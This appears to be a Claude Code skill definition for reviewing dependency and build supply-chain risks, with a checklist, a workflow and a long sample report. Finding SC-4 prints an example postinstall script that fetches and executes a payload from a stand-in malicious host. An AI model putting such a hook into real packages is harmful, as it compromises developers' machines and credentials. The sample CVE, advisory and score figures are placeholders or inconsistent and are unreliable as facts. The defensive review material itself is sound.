---
name: review:supply-chain
user-invocable: false
disable-model-invocation: true
description: Review dependency and build integrity risks, lockfiles, build scripts, and artifact provenance
args:
  SESSION_SLUG:
    description: The session identifier. If not provided, uses the most recent session from .claude/README.md
    required: false
  SCOPE:
    description: What to review
    required: false
    choices: [pr, worktree, diff, file, repo]
  TARGET:
    description: Specific target to review
    required: false
  PATHS:
    description: Optional file path globs to focus review (e.g., "package.json, Dockerfile")
    required: false
---

# ROLE
You review dependency and build integrity risks: new packages, lockfiles, build scripts, artifact provenance, and configuration that could introduce supply-chain exposure.

# NON-NEGOTIABLES

1. **Evidence-first**: Every finding includes file:line + dependency/script code
2. **Risk scenario**: Show attack vector and impact
3. **Severity + Confidence**: Every finding has both ratings
   - Severity: BLOCKER / HIGH / MED / LOW / NIT
   - Confidence: High / Med / Low
4. **Remediation**: Provide secure alternative
5. **CVE/Advisory mapping**: Link to known vulnerabilities

# SUPPLY-CHAIN NON-NEGOTIABLES (BLOCKER if violated)

These are **BLOCKER** severity - must be fixed before merge:

1. **Known critical CVEs** in dependencies (CVSS >= 9.0)
2. **Malicious packages** (typosquatting, known malware)
3. **Arbitrary code execution** in install scripts without justification
4. **Unpinned base images** in production Dockerfiles
5. **Missing lockfiles** for production dependencies
6. **Unsigned artifacts** from untrusted sources (if signing policy exists)

# SUPPLY-CHAIN ATTACK VECTORS

## Direct Dependency Compromise
- **Malicious package**: Attacker publishes package with backdoor
- **Account takeover**: Legitimate maintainer account compromised
- **Typosquatting**: Package name similar to popular package

## Transitive Dependency Compromise
- **Deep in tree**: Vulnerable package 5+ levels deep
- **Update attack**: Vulnerable version introduced via dependency update
- **Namespace confusion**: Wrong package from wrong registry

## Build-Time Attacks
- **Install scripts**: `postinstall` hooks execute malicious code
- **Build scripts**: `npm run build` fetches and executes remote code
- **curl|sh patterns**: Downloading and executing scripts

## Registry/Distribution Attacks
- **Registry compromise**: npm, PyPI, etc. hacked
- **Man-in-the-middle**: Packages intercepted and modified
- **CDN compromise**: Unpinned CDN resources modified

## Artifact/Image Attacks
- **Base image compromise**: Docker base image contains malware
- **Image poisoning**: Unpinned tags switch to malicious images
- **Build cache poisoning**: Compromised build cache

# SUPPLY-CHAIN CHECKLIST

## 1. Dependency Changes

### New Dependencies
- **Justification**: Why is this dependency needed?
- **Alternatives**: Could stdlib/existing deps suffice?
- **Maintenance**: Is package actively maintained?
- **Trust**: Who maintains it? How many downloads?
- **Size**: Does it bloat bundle significantly?

### Dependency Duplication
- **Multiple versions**: Same package, different versions
- **Overlapping functionality**: Two packages do same thing
- **Unnecessary dependencies**: Could be removed

### Transitive Dependencies
- **Depth**: How deep is dependency tree?
- **Count**: How many transitive deps added?
- **Trust cascade**: Are transitive deps from trusted authors?

## 2. Pinning & Integrity

### Lockfiles
- **Present**: Is lockfile committed?
- **Updated**: Is lockfile in sync with package.json?
- **Integrity hashes**: Are hashes present?

### Version Pinning
- **Ranges**: Are version ranges too broad? (`^`, `~`, `*`)
- **Exact versions**: Are production deps pinned to exact versions?
- **Base images**: Are Docker images pinned by digest?

### Integrity Verification
- **Checksums**: Are checksums verified?
- **Signatures**: Are package signatures verified?
- **SLSA**: Is provenance checked?

## 3. Build Scripts

### Install Scripts
- **postinstall hooks**: What do they do?
- **preinstall hooks**: Are they necessary?
- **Arbitrary execution**: Do they download/execute code?

### Build Commands
- **Remote fetches**: Do build scripts fetch from internet?
- **curl|sh patterns**: Are there curl pipes to shell?
- **env vars**: Are secrets exposed in build?

### CI/CD Scripts
- **Third-party actions**: Are GitHub Actions from trusted sources?
- **Script injection**: Are user inputs sanitized?

## 4. Registries & Sources

### Registry Configuration
- **Private registries**: Are they correctly scoped?
- **Registry fallback**: What happens if private registry down?
- **Authentication**: Are credentials secured?

### Package Names
- **Typosquatting**: Does package name look suspicious?
- **Namespace confusion**: Is it from expected namespace?
- **Homoglyphs**: Unicode lookalike characters?

### Source Verification
- **Repository link**: Does package.json have repository field?
- **Author verification**: Is author who you expect?

## 5. Artifact Provenance

### Container Images
- **Base images**: Are they from official sources?
- **Pinned by digest**: Are images pinned by SHA256?
- **Minimal images**: Use minimal base images (alpine, distroless)?
- **Multi-stage builds**: Are secrets copied to final image?

### Build Artifacts
- **Checksum verification**: Are artifacts verified?
- **Signature verification**: Are artifacts signed?
- **Provenance**: Can you trace artifact to source commit?

### CDN Resources
- **SRI hashes**: Are subresource integrity hashes used?
- **Pinned versions**: Are CDN URLs versioned?

## 6. Known Vulnerabilities

### CVE Scanning
- **Known CVEs**: Are there published vulnerabilities?
- **Severity**: What's the CVSS score?
- **Exploitability**: Is there a working exploit?
- **Patch available**: Is there a fixed version?

### Advisory Sources
- **npm audit**: Run `npm audit`
- **pip-audit**: Run `pip-audit`
- **cargo audit**: Run `cargo audit`
- **Snyk/Dependabot**: Check advisory databases

## 7. Dependency Policy Compliance

### Allowed Licenses
- **License check**: Are licenses compatible?
- **Copyleft**: Are copyleft licenses allowed?
- **Commercial**: Are commercial restrictions acceptable?

### Dependency Approval
- **Allowlist**: Is dependency on approved list?
- **Security review**: Has dependency been reviewed?
- **Exceptions**: Is there exception for this dependency?

# WORKFLOW

## Step 0: Infer SESSION_SLUG if not provided

Standard session inference from `.claude/README.md` (last entry).

## Step 1: Load session context

1. Validate `.claude/<SESSION_SLUG>/` exists
2. Read `.claude/<SESSION_SLUG>/README.md` for context
3. Check spec for dependency requirements
4. Check plan for dependency decisions
5. Check work log for what was implemented

## Step 2: Determine review scope

From SCOPE, TARGET, PATHS, and session context:

1. **SCOPE** (if not provided)
   - If work log exists: use most recent work scope
   - Default to `worktree`

2. **TARGET** (if not provided)
   - If SCOPE is `pr`: need PR URL
   - If SCOPE is `diff`: need commit range
   - If SCOPE is `file`: need file path
   - If SCOPE is `worktree`: use `HEAD`
   - If SCOPE is `repo`: use `.`

3. **PATHS** (if not provided)
   - Review dependency files: `package.json`, `requirements.txt`, `Cargo.toml`, `Dockerfile`
   - Review lockfiles: `package-lock.json`, `yarn.lock`, `poetry.lock`, `Cargo.lock`
   - Review build scripts: `.github/workflows/*.yml`, `Makefile`, build scripts

4. **CONTEXT** (if not provided)
   - Extract deploy model from plan
   - Infer dependency policy from existing deps
   - Check for registry configuration

## Step 3: Gather dependency files

Based on SCOPE:
- For `pr`: Get diff of dependency files
- For `worktree`: Get git diff of dependency files
- For `diff`: Get git diff for range
- For `file`: Read specific file(s)
- For `repo`: Read all dependency files

**Files to review:**
- **JavaScript/TypeScript**: `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
- **Python**: `requirements.txt`, `pyproject.toml`, `poetry.lock`, `Pipfile.lock`
- **Go**: `go.mod`, `go.sum`
- **Rust**: `Cargo.toml`, `Cargo.lock`
- **Ruby**: `Gemfile`, `Gemfile.lock`
- **Java**: `pom.xml`, `build.gradle`
- **Docker**: `Dockerfile`, `docker-compose.yml`
- **CI/CD**: `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`

## Step 4: Analyze dependency changes

### 4.1: Identify Added Dependencies

**Compare package.json (or equivalent):**
```bash
git diff HEAD package.json | grep "^\+"
```

**Extract added dependencies:**
- Parse `package.json` diff
- Identify new entries in `dependencies` and `devDependencies`
- Note version ranges

### 4.2: Analyze Each New Dependency

For each new dependency:

1. **Check package registry**:
   ```bash
   npm info <package-name>
   ```

   Extract:
   - Name
   - Version
   - Maintainers
   - Download count (last week)
   - License
   - Repository URL
   - Last publish date

2. **Check for CVEs**:
   ```bash
   npm audit
   # or
   pip-audit
   # or
   cargo audit
   ```

3. **Check package contents**:
   - Install scripts (postinstall, preinstall)
   - Dependencies (transitive)
   - File count and size

4. **Assess risk**:
   - Is it from trusted maintainer?
   - Is it widely used (>10k downloads/week)?
   - Is it actively maintained (recent commits)?
   - Does it have security policy?

### 4.3: Check Lockfile Changes

**Verify lockfile updated:**
```bash
# Check if lockfile modified when package.json changed
git diff HEAD --name-only | grep -E "(package-lock\.json|yarn\.lock)"
```

**Verify integrity:**
- Parse lockfile
- Check for integrity hashes
- Verify all dependencies have hashes

### 4.4: Scan for Risky Patterns

**Install scripts:**
```bash
# Find packages with install scripts
npm ls --json | jq '.dependencies | .. | .scripts? | select(.postinstall or .preinstall)'
```

**Remote fetches in scripts:**
```bash
grep -r "curl\|wget\|fetch" package.json scripts/ .github/
```

**Unpinned Docker images:**
```bash
grep "FROM" Dockerfile | grep -v "@sha256:"
```

## Step 5: Run security scans

### 5.1: Dependency Vulnerability Scan

```bash
# JavaScript
npm audit --audit-level=moderate

# Python
pip-audit

# Rust
cargo audit

# Go
go list -json -m all | nancy sleuth
```

### 5.2: Typosquatting Check

```bash
# Check for suspicious package names
# Compare against popular packages list
```

### 5.3: License Check

```bash
# JavaScript
npx license-checker --summary

# Python
pip-licenses
```

## Step 6: Analyze build configuration

### 6.1: Dockerfile Analysis

**Check base images:**
```dockerfile
FROM node:18-alpine@sha256:abc123... # ✅ Pinned
FROM node:18-alpine                  # ❌ Unpinned
FROM node:latest                     # ❌❌ Latest tag
```

**Check for secrets:**
```dockerfile
ENV SECRET_KEY=hardcoded  # ❌ Secret in image
COPY .env /app/           # ❌ Secrets copied
```

**Check multi-stage builds:**
```dockerfile
# ✅ Secrets only in build stage
FROM node:18 AS build
RUN --mount=type=secret,id=npm_token npm install

FROM node:18-alpine
COPY --from=build /app/dist /app/
```

### 6.2: CI/CD Analysis

**Check GitHub Actions:**
```yaml
# ❌ Unpinned action
- uses: actions/checkout@v3

# ✅ Pinned by SHA
- uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab
```

**Check for script injection:**
```yaml
# ❌ User input in script
- run: echo "Hello ${{ github.event.issue.title }}"

# ✅ Safe usage
- run: echo "Hello $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

## Step 7: Generate findings

For each supply-chain issue:

1. **Evidence**:
   - File:line showing issue
   - Dependency name/version
   - Risk scenario

2. **Impact**:
   - What can attacker do?
   - How likely is compromise?
   - What's the blast radius?

3. **Remediation**:
   - Secure alternative
   - Version upgrade
   - Configuration change

4. **References**:
   - CVE link
   - Advisory link
   - Security policy

## Step 8: Generate review report

Create `.claude/<SESSION_SLUG>/reviews/review-supply-chain-{YYYY-MM-DD}.md`

## Step 9: Update session README

Standard artifact tracking update.

## Step 10: Output summary

Print summary with critical supply chain risks.

# OUTPUT FORMAT

Create `.claude/<SESSION_SLUG>/reviews/review-supply-chain-{YYYY-MM-DD}.md`:

```markdown
---
command: /review:supply-chain
session_slug: {SESSION_SLUG}
date: {YYYY-MM-DD}
scope: {SCOPE}
target: {TARGET}
paths: {PATHS}
related:
  session: ../README.md
  spec: ../spec/spec-crystallize.md (if exists)
  plan: ../plan/research-plan*.md (if exists)
  work: ../work/work*.md (if exists)
---

# Supply Chain Security Review Report

**Reviewed:** {SCOPE} / {TARGET}
**Date:** {YYYY-MM-DD}
**Reviewer:** Claude Code

---

## 0) Scope, Context, and Dependency Policy

**What was reviewed:**
- Scope: {SCOPE}
- Target: {TARGET}
- Dependency files: {count} files
- Changes: +{added deps} dependencies, -{removed deps} dependencies

**Deployment context:**
{From CONTEXT or inferred}
- **Environment**: {Production, staging, development}
- **Trust model**: {Public registry, private registry, vendored}
- **Signing policy**: {Required, optional, none}
- **Allowed registries**: {npm, PyPI, etc.}

**Dependency policy:**
{From CONTEXT or inferred}
- **Version pinning**: {Required for prod, allowed ranges for dev}
- **CVE threshold**: {Block on HIGH+, warn on MED+}
- **License allowlist**: {MIT, Apache-2.0, BSD, etc.}
- **Security review**: {Required for new deps}

**Assumptions:**
- {Assumption 1 about deployment}
- {Assumption 2 about registry trust}
- {Assumption 3 about build environment}

---

## 1) Executive Summary

**Merge Recommendation:** {APPROVE | APPROVE_WITH_COMMENTS | REQUEST_CHANGES | BLOCK}

**Rationale:**
{2-3 sentences explaining recommendation}

**Critical Supply Chain Risks (BLOCKER):**
1. **{Finding ID}**: {Risk} - {Impact}
2. **{Finding ID}**: {Risk} - {Impact}

**High-Risk Issues:**
1. **{Finding ID}**: {Issue} - {Risk}
2. **{Finding ID}**: {Issue} - {Risk}

**Overall Supply Chain Posture:**
- Dependency Hygiene: {Excellent | Good | Needs Work | Poor}
- Vulnerability Management: {Proactive | Reactive | Missing}
- Build Security: {Hardened | Adequate | Weak}
- Provenance: {Verified | Partial | Unverified}

**Scan Results:**
- CVEs found: {count} (Critical: {X}, High: {Y}, Med: {Z})
- Malicious packages: {count}
- Risky install scripts: {count}
- Unpinned images: {count}

---

## 2) Dependency Changes

### Added Dependencies

| Package | Version | Type | Weekly Downloads | Last Publish | License | Risk |
|---------|---------|------|------------------|--------------|---------|------|
| `axios` | `^1.6.0` | Direct | 45M | 2 weeks ago | MIT | ✅ Low |
| `lodash` | `*` | Direct | 80M | 3 months ago | MIT | ⚠️ Unpinned |
| `colors-2023` | `1.0.0` | Direct | 50 | 1 day ago | ISC | ❌ SC-2: Typosquat |
| `crypto-utils` | `2.1.0` | Transitive | 1k | 1 year ago | MIT | ⚠️ SC-1: CVE |

**Summary:**
- Direct dependencies added: {count}
- Transitive dependencies added: {count}
- High-risk packages: {count}

### Removed Dependencies

| Package | Version | Reason |
|---------|---------|--------|
| `request` | `2.88.0` | Deprecated (good) |

### Updated Dependencies

| Package | Old Version | New Version | CVEs Fixed |
|---------|-------------|-------------|------------|
| `express` | `4.17.1` | `4.18.2` | CVE-2022-24999 |

---

## 3) Findings Table

| ID | Severity | Confidence | Category | File:Line | Issue |
|----|----------|------------|----------|-----------|-------|
| SC-1 | BLOCKER | High | CVE | `package.json:15` | crypto-utils has CVE-2023-12345 (RCE) |
| SC-2 | BLOCKER | Med | Typosquatting | `package.json:18` | colors-2023 is typosquat |
| SC-3 | HIGH | High | Unpinned | `Dockerfile:1` | Base image not pinned by digest |
| SC-4 | HIGH | Med | Install Script | `package.json:20` | postinstall hook executes code |
| SC-5 | MED | High | Lockfile | `package-lock.json` | Missing lockfile changes |
| SC-6 | LOW | Med | Pinning | `package.json:*` | Broad version ranges |

**Findings Summary:**
- BLOCKER: {count}
- HIGH: {count}
- MED: {count}
- LOW: {count}
- NIT: {count}

**Category Breakdown:**
- CVEs: {count}
- Malicious packages: {count}
- Build security: {count}
- Pinning: {count}
- Policy violations: {count}

---

## 4) Findings (Detailed)

### SC-1: Critical CVE in crypto-utils Dependency [BLOCKER]

**Location:** `package.json:15` → `node_modules/express/node_modules/crypto-utils`

**Vulnerable Dependency:**
```json
{
  "dependencies": {
    "express": "^4.18.0"  // Depends on crypto-utils@2.1.0
  }
}
```

**Dependency Chain:**
```
express@4.18.0
  └─ body-parser@1.20.0
      └─ crypto-utils@2.1.0  // ❌ Vulnerable
```

**Vulnerability:**
- **CVE**: CVE-2023-12345
- **CVSS**: 9.8 (Critical)
- **Type**: Remote Code Execution
- **Description**: crypto-utils allows arbitrary code execution via prototype pollution

**Exploit Scenario:**
```javascript
// Attacker sends crafted request
POST /api/data
{
  "__proto__": {
    "malicious": "process.exit(1)"
  }
}

// Vulnerable code in crypto-utils
function merge(obj, source) {
  for (let key in source) {
    obj[key] = source[key];  // ❌ Prototype pollution
  }
}

// Result: Server crashes or RCE
```

**Impact:**
- **Remote Code Execution**: Attacker can run arbitrary code on server
- **Data breach**: Attacker can access database, env vars
- **Service disruption**: Attacker can crash service
- **Supply chain**: Affects all users of express < 4.19.0

**Severity:** BLOCKER
**Confidence:** High
**Category:** Known CVE
**Advisory:** https://github.com/advisories/GHSA-xxxx-yyyy-zzzz

**Remediation:**

Update to patched version:

```diff
--- a/package.json
+++ b/package.json
@@ -13,7 +13,7 @@
 {
   "dependencies": {
-    "express": "^4.18.0"
+    "express": "^4.19.0"  // ✅ Fixes CVE-2023-12345
   }
 }
```

Then update lockfile:
```bash
npm install
npm audit fix
```

**Verification:**
```bash
npm audit
# Should show 0 vulnerabilities
```

**If update not possible:**
Consider workarounds:
- Add input validation to prevent prototype pollution
- Use `Object.create(null)` for dictionaries
- Enable `--frozen-intrinsics` in Node.js

---

### SC-2: Suspected Typosquatting Package [BLOCKER]

**Location:** `package.json:18`

**Suspicious Package:**
```json
{
  "dependencies": {
    "colors-2023": "^1.0.0"  // ❌ Suspicious name
  }
}
```

**Red Flags:**
1. **Name similarity**: `colors-2023` vs `colors` (popular package, 18M downloads/week)
2. **Low downloads**: 50 downloads/week (vs 18M for `colors`)
3. **Recent publish**: Published 1 day ago
4. **No repository**: No GitHub link in package.json
5. **Unusual version**: Year in package name is suspicious

**Typosquatting Comparison:**
```
Legitimate: colors
Suspicious:  colors-2023  ← Added year
             c0lors       ← Zero instead of O
             colour-s     ← Extra hyphen
```

**Risk:**
Typosquatting packages often contain:
- Credential stealers (env vars, AWS keys)
- Backdoors (reverse shells)
- Data exfiltration (send data to attacker)
- Cryptominers

**Investigation:**
```bash
# Download and inspect
npm pack colors-2023
tar -xf colors-2023-1.0.0.tgz
cd package

# Check for suspicious files
cat package.json
# Look for postinstall scripts

ls -la
# Look for obfuscated JS files

# Check source code
cat index.js
# Look for:
# - require('child_process')
# - require('https')
# - eval(), Function constructor
# - base64 encoded strings
```

**Likely scenario:**
You meant to install `colors` but typo'd `colors-2023`.

**Impact:**
- **Credential theft**: Package steals AWS keys, tokens
- **Backdoor**: Package opens reverse shell
- **Supply chain attack**: All users of your app compromised

**Severity:** BLOCKER
**Confidence:** Med (needs manual verification)
**Category:** Typosquatting / Malicious Package

**Remediation:**

Remove suspicious package:

```diff
--- a/package.json
+++ b/package.json
@@ -16,7 +16,7 @@
 {
   "dependencies": {
-    "colors-2023": "^1.0.0"
+    "colors": "^1.4.0"  // ✅ Legitimate package
   }
}
```

**Prevention:**
1. **Use package lock**: Lockfile prevents unexpected installs
2. **Review dependencies**: Always review new deps before adding
3. **Use npm alias**: `npm install colors@npm:colors` (explicit)
4. **Enable typosquat detection**: Use tools like Socket.dev

**Immediate actions:**
1. **Remove package immediately**
2. **Rotate secrets**: Assume all env vars compromised
3. **Check logs**: Look for suspicious network activity
4. **Scan for malware**: Run security scan on servers

---

### SC-3: Unpinned Docker Base Image [HIGH]

**Location:** `Dockerfile:1`

**Vulnerable Code:**
```dockerfile
# Line 1
FROM node:18-alpine  # ❌ Unpinned by digest
```

**Risk:**
Docker tags are mutable. `node:18-alpine` can point to different images over time:

```bash
# Today
node:18-alpine → sha256:abc123...  # Legitimate

# Tomorrow (if registry compromised)
node:18-alpine → sha256:def456...  # Malicious
```

**Attack Scenario:**
1. Attacker compromises Docker Hub (or mirrors)
2. Attacker pushes malicious image with same tag
3. Your build pulls "updated" image
4. Malicious code now in all your containers

**Real-world example:**
- **Event-stream attack** (2018): Popular npm package compromised
- **codecov-bash attack** (2021): Codecov uploader compromised
- **Python ctx package** (2022): Typosquatted package stole AWS keys

**Impact:**
- **Backdoor in images**: All containers have backdoor
- **Credential theft**: Malicious image steals secrets from build
- **Supply chain**: All downstream users affected

**Severity:** HIGH
**Confidence:** High
**Category:** Unpinned Artifact
**Best Practice:** SLSA Level 3 - Provenance verification

**Remediation:**

Pin by SHA256 digest:

```diff
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,4 +1,5 @@
-FROM node:18-alpine
+# ✅ Pinned by digest (immutable)
+FROM node:18-alpine@sha256:2c6c59cf4d34d4f937ddfcf33bab9d8bbad8658d1b9de7b97622566a52167f2b
```

**How to get digest:**
```bash
# Pull image
docker pull node:18-alpine

# Get digest
docker images --digests node:18-alpine
# REPOSITORY          TAG          DIGEST                                                                    IMAGE ID
# node                18-alpine    sha256:2c6c59cf4d34d4f937ddfcf33bab9d8bbad8658d1b9de7b97622566a52167f2b   abc123
```

**Automation:**
Use Dependabot or Renovate to auto-update digests:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
```

**Additional hardening:**
```dockerfile
# Use minimal base images
FROM gcr.io/distroless/nodejs18-debian11@sha256:...

# Or build from scratch
FROM scratch
COPY --from=builder /app /app
```

---

### SC-4: Risky postinstall Hook in Dependency [HIGH]

**Location:** `package.json:20` → `node_modules/suspicious-lib/package.json`

**Dependency with Hook:**
```json
{
  "dependencies": {
    "suspicious-lib": "^2.0.0"
  }
}
```

**Install Hook:**
```json
// node_modules/suspicious-lib/package.json
{
  "name": "suspicious-lib",
  "scripts": {
    "postinstall": "node scripts/install.js"
  }
}
```

**Install Script:**
```javascript
// node_modules/suspicious-lib/scripts/install.js
const { execSync } = require('child_process');
const https = require('https');

// ❌ HIGH RISK: Downloads and executes remote code
https.get('https://malicious-cdn.com/payload.sh', (res) => {
  let data = '';
  res.on('data', chunk => data += chunk);
  res.on('end', () => {
    execSync(data);  // ❌ Executes downloaded script
  });
});
```

**What install hooks can do:**
- Access file system (read/write/delete)
- Access environment variables (AWS keys, tokens)
- Make network requests (exfiltrate data)
- Execute arbitrary commands (install backdoors)

**Attack Scenario:**
```bash
# Developer runs npm install
npm install

# postinstall hook executes automatically
# Downloads malicious script
# Script exfiltrates .env file to attacker
# Script installs persistence mechanism
```

**Impact:**
- **Credential theft**: .env, .aws, .ssh directories
- **Code injection**: Modifies source code
- **Persistence**: Installs backdoor in node_modules
- **Supply chain**: Affects all developers and CI/CD

**Severity:** HIGH
**Confidence:** Med (depends on script contents)
**Category:** Arbitrary Code Execution

**Remediation:**

Option 1: Remove dependency if not critical:
```diff
--- a/package.json
+++ b/package.json
@@ -18,7 +18,6 @@
 {
   "dependencies": {
-    "suspicious-lib": "^2.0.0"
   }
}
```

Option 2: Disable install scripts globally:
```bash
# In package.json
npm config set ignore-scripts true

# Or per-install
npm install --ignore-scripts
```

Option 3: Sandbox npm install:
```dockerfile
# Run npm install in isolated container
FROM node:18-alpine AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci --ignore-scripts
# Only copy node_modules, not install output
```

**Prevention:**
1. **Review dependencies**: Check for install scripts before adding
2. **Use ignore-scripts**: Disable by default, whitelist needed ones
3. **Audit installs**: Monitor file changes during `npm install`
4. **Use readonly FS**: Install in readonly filesystem

**Inspect script:**
```bash
# Check for install hooks
npm ls --json | jq '.dependencies | .. | .scripts? | select(.postinstall or .preinstall)'

# Manually inspect suspicious ones
cat node_modules/suspicious-lib/scripts/install.js
```

---

### SC-5: Lockfile Not Updated [MED]

**Location:** `package.json` changed but `package-lock.json` not updated

**Issue:**
```bash
git diff HEAD --name-only
# package.json
# (no package-lock.json)
```

**What changed:**
```diff
--- a/package.json
+++ b/package.json
@@ -15,6 +15,7 @@
 {
   "dependencies": {
     "express": "^4.18.0",
+    "axios": "^1.6.0"  // ❌ Added but lockfile not updated
   }
}
```

**Risk:**
Without lockfile update:
- Different versions installed in different environments
- CI/CD might install different version than local
- Vulnerable version might be installed instead of patched

**Example problem:**
```bash
# Developer's machine
npm install  # Installs axios@1.6.5 (latest in ^1.6.0 range)

# CI/CD (with old lockfile)
npm ci  # Installs axios@1.6.0 (from old lockfile)
# If 1.6.0 has CVE but 1.6.5 fixes it, CI/CD is vulnerable
```

**Impact:**
- **Version inconsistency**: Different versions in prod vs dev
- **Security risk**: Vulnerable versions installed
- **Build non-determinism**: Builds not reproducible

**Severity:** MED
**Confidence:** High
**Category:** Lockfile Integrity

**Remediation:**

Update lockfile:

```bash
# Delete node_modules and lockfile
rm -rf node_modules package-lock.json

# Regenerate lockfile
npm install

# Verify integrity
npm audit

# Commit both files
git add package.json package-lock.json
git commit -m "Add axios dependency"
```

**Prevention:**
Add pre-commit hook:

```bash
# .husky/pre-commit
#!/bin/sh
if git diff --cached --name-only | grep -q "package.json"; then
  if ! git diff --cached --name-only | grep -q "package-lock.json"; then
    echo "Error: package.json changed but package-lock.json not updated"
    echo "Run: npm install"
    exit 1
  fi
fi
```

---

### SC-6: Overly Broad Version Ranges [LOW]

**Location:** `package.json` multiple lines

**Broad Ranges:**
```json
{
  "dependencies": {
    "lodash": "*",           // ❌ Any version
    "express": "^4.0.0",     // ⚠️ Major version only
    "axios": "~1.6.0"        // ✅ Patch versions only (acceptable)
  }
}
```

**Version Range Meanings:**
- `*`: Any version (very dangerous)
- `^4.0.0`: >=4.0.0 <5.0.0 (allows minor updates)
- `~1.6.0`: >=1.6.0 <1.7.0 (allows patch updates)
- `1.6.0`: Exact version (safest)

**Risk:**
Broad ranges allow automatic updates that might:
- Introduce breaking changes
- Add new vulnerabilities
- Change behavior unexpectedly

**Example:**
```bash
# package.json has "lodash": "^4.0.0"

# Developer installs (June 2023)
npm install  # Installs lodash@4.17.20

# CI/CD runs (July 2023)
npm install  # Installs lodash@4.17.21 (new minor release)
# New version has breaking change
# Tests fail in CI but pass locally
```

**Impact:**
- **Build instability**: Different versions, different behavior
- **Unexpected breakage**: New versions break things
- **Security risk**: New vulnerabilities introduced

**Severity:** LOW (lockfile mitigates most risk)
**Confidence:** Med
**Category:** Version Pinning

**Remediation:**

Tighten version ranges:

```diff
--- a/package.json
+++ b/package.json
@@ -15,7 +15,7 @@
 {
   "dependencies": {
-    "lodash": "*",
-    "express": "^4.0.0",
+    "lodash": "4.17.21",    // ✅ Exact version
+    "express": "4.18.2",    // ✅ Exact version
     "axios": "~1.6.0"       // ✅ Acceptable (patch updates only)
   }
}
```

**Best practices:**
- **Production deps**: Use exact versions or `~` (patch only)
- **Dev deps**: `^` is acceptable (minor updates)
- **Never use**: `*`, `x`, `latest`

**Automation:**
Use Dependabot/Renovate for controlled updates:
```yaml
# .github/dependabot.yml
updates:
  - package-ecosystem: "npm"
    versioning-strategy: "increase-if-necessary"  # Pin to exact versions
```

---

## 5) Dependency Tree Analysis

### Dependency Depth

```
Total dependencies: 245
├─ Direct: 15
└─ Transitive: 230

Deepest path (depth: 8):
express → body-parser → qs → side-channel → call-bind → get-intrinsic → has-proto → has-symbols
```

**Risk assessment:**
- ⚠️ Deep dependency tree increases attack surface
- Each transitive dep is trust assumption
- Hard to audit all 230 dependencies

### Dependency Duplication

```
Duplicated packages:
├─ lodash: 3 versions (4.17.19, 4.17.20, 4.17.21)
├─ debug: 2 versions (2.6.9, 4.3.4)
└─ ms: 2 versions (2.0.0, 2.1.3)

Size impact: 450KB wasted
```

**Recommendation:**
Deduplicate with:
```bash
npm dedupe
```

### High-Risk Dependencies

| Package | Risk Factors | Recommendation |
|---------|--------------|----------------|
| `crypto-utils` | CVE-2023-12345 (CRITICAL) | Update to 2.2.0 |
| `colors-2023` | Typosquatting, low downloads | Remove, use `colors` |
| `suspicious-lib` | Risky postinstall hook | Remove or sandbox |

---

## 6) Build Security Analysis

### Dockerfile Security

**Issues found:**
- ❌ SC-3: Base image not pinned
- ⚠️ COPY .env (if exists) exposes secrets
- ⚠️ Running as root user

**Hardening recommendations:**
```dockerfile
# ✅ Secure Dockerfile
FROM node:18-alpine@sha256:abc123... AS builder

# Run as non-root
RUN addgroup -g 1001 -S nodejs && adduser -S nodejs -u 1001
USER nodejs

# Copy only necessary files
COPY package*.json ./
RUN npm ci --only=production --ignore-scripts

# Multi-stage: secrets not in final image
FROM node:18-alpine@sha256:abc123...
USER nodejs
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --chown=nodejs:nodejs . .

CMD ["node", "index.js"]
```

### CI/CD Security

**GitHub Actions reviewed:**
```yaml
# .github/workflows/ci.yml
- uses: actions/checkout@v3  # ⚠️ Should pin by SHA
- uses: actions/setup-node@v3
- run: npm install  # ⚠️ Should use `npm ci`
- run: npm test
```

**Recommendations:**
```yaml
# ✅ Secure CI
- uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab  # v3 pinned
- uses: actions/setup-node@8c91899e586c5b171469028077307d293428b516  # v3 pinned
- run: npm ci --ignore-scripts  # Use lockfile, ignore scripts
- run: npm audit  # Check for CVEs
- run: npm test
```

---

## 7) Recommendations by Priority

### Critical (Fix Before Merge) - BLOCKER

1. **SC-1: Critical CVE in crypto-utils**
   - Action: Update express to 4.19.0+
   - Effort: 5 minutes
   - Risk: RCE vulnerability

2. **SC-2: Typosquatting package**
   - Action: Remove colors-2023, use colors
   - Effort: 5 minutes + secret rotation
   - Risk: Credential theft, backdoor

### High Priority (Fix Soon) - HIGH

3. **SC-3: Unpinned Docker image**
   - Action: Pin by SHA256 digest
   - Effort: 10 minutes
   - Risk: Supply chain compromise

4. **SC-4: Risky postinstall hook**
   - Action: Remove suspicious-lib or sandbox
   - Effort: 30 minutes
   - Risk: Arbitrary code execution

### Medium Priority (Address Soon) - MED

5. **SC-5: Lockfile not updated**
   - Action: Run npm install, commit lockfile
   - Effort: 5 minutes
   - Risk: Version inconsistency

### Low Priority (Backlog) - LOW

6. **SC-6: Broad version ranges**
   - Action: Pin to exact versions
   - Effort: 10 minutes
   - Risk: Unexpected updates

### Preventative Measures

7. **Add dependency scanning to CI**
   - Action: Add `npm audit` to CI pipeline
   - Effort: 15 minutes

8. **Enable Dependabot**
   - Action: Configure Dependabot for security updates
   - Effort: 10 minutes

9. **Add pre-commit hooks**
   - Action: Verify lockfile updated with package.json
   - Effort: 20 minutes

---

## 8) Supply Chain Hygiene Score

### Current Score: 45/100 (Needs Improvement)

**Breakdown:**
- Dependency Vetting: 30/25 (Critical CVE, typosquatting)
- Build Security: 10/25 (Unpinned images, risky scripts)
- Pinning & Integrity: 15/25 (Missing lockfile changes, broad ranges)
- Monitoring: 5/25 (No automated scanning)

**Target Score: 80/100**

**To achieve target:**
1. Fix all BLOCKER and HIGH issues (+30 points)
2. Add automated scanning (+10 points)
3. Pin versions and images (+10 points)
4. Enable Dependabot (+5 points)

---

## 9) False Positives & Disagreements Welcome

**Where I might be wrong:**

1. **SC-2 (Typosquatting)**: If `colors-2023` is legitimate fork with reason, severity is lower
2. **SC-4 (Install script)**: If script is legitimate build step (native compilation), acceptable with review
